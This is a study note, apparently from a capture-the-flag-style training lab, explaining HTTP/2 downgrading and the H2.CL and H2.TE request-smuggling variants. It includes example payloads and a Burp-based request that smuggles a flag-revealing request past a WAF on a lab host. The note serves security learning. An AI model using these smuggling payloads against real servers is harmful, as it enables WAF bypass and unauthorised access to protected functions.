# HTTP/2 Downgrading

- Happens when HTTP clients talk HTTP/2 to the reverse proxy but the reverse proxy and web server talk HTTP/1.1
- Rev proxy rewrites all incoming 2 req’s to 1.1 and all res back to 2
- **Makes req smggling possible again**

![image.png](HTTP%202%20Downgrading/image.png)

### **Downgrading leading to Request Smuggling**

[HTTP/2 RFC](https://datatracker.ietf.org/doc/html/rfc7540):

```
A request or response that includes a payload body can include a content-length header field.

A request or response is also malformed if the value of a content-length header field does not equal the sum of the DATA frame payload lengths that form the body.
```

Thus, the CL header is explicitly allowed, provided it is correct. 
**However, if the reverse proxy does not properly validate that the 
provided CL header is correct and instead rewrites the request to 
HTTP/1.1 using the faulty CL header, request smuggling vulnerabilities 
arise.** This results in a so-called `H2.CL` vulnerability. Assuming an attacker sends the following HTTP/2 request (header names are `red`, header values are `green`, and the request body is `yellow`):

---

**H2.CL**

```
:method POST
:path /
:authority http2.htb
:scheme http
content-length 0
GET /smuggled HTTP/1.1
Host: http2.htb
```

The vulnerable reverse proxy trusts the provided CL header and thus uses it when rewriting the request to HTTP/1.1, resulting in the following TCP stream:

```
POST / HTTP/1.1
Host: http2.htb
Content-Length: 0

GET /smuggled HTTP/1.1
Host: http2.htb
```

---

**H2.TE**
`The "chunked" transfer encoding defined in [Section 4.1 of [RFC7230]] MUST NOT be used in HTTP/2.`

If a reverse proxy fails to reject HTTP/2 requests containing the TE 
header and uses it when rewriting the request to HTTP/1.1, we can 
achieve request smuggling with an HTTP/2 request similar to the 
following (header names are `red`, header values are `green`, and the request body is `yellow`):

```python
:method POST
:path /
:authority http2.htb
:scheme http
transfer-encoding chunked
0

GET /smuggled HTTP/1.1
Host: http2.htb
```

A vulnerable reverse proxy creates the following TCP stream:

```
POST / HTTP/1.1
Host: http2.htb
Transfer-Encoding: chunked
Content-Length: 48

0

GET /smuggled HTTP/1.1
Host: http2.htb
```

The reverse proxy adds the CL header in the rewriting process to inform the web server about the request body's length. However, since the TE header has precedence over the CL header in HTTP/1.1, the web server treats the first request as having chunked encoding

---

### Example

<aside>
💡

Make sure to uncheck the `Update Content-Length` option in Burp Repeater

</aside>

The flag can be revealed by sending a request with the GET parameter `reveal_flag=1`. However, the  WAF blocks all requests containing this GET parameter. To bypass the WAF, we can utilize an `H2.CL` vulnerability.

```python
POST /index.php HTTP/2
Host: http2.htb
Content-Length: 0

POST /index.php?reveal_flag=1 HTTP/1.1
Host: http2.htb
```

Due to the behavior explained above, this will bypass the WAF and reveal the flag for us. When we need to obtain the response to our smuggled request, we can use tab groups in Burp and send multiple requests subsequently via the same TCP connection

<aside>
💡

**Note:** Remember to keep the syntax of the smuggled request correct by hiding the first request line of the second request in a dummy header. Keep in mind that the mandatory `Host` header will be appended by the follow-up request.

</aside>

```python
POST /index.php HTTP/2
Host: http2.htb
Content-Length: 0

POST /index.php?reveal_flag=1 HTTP/1.1
Foo: 

```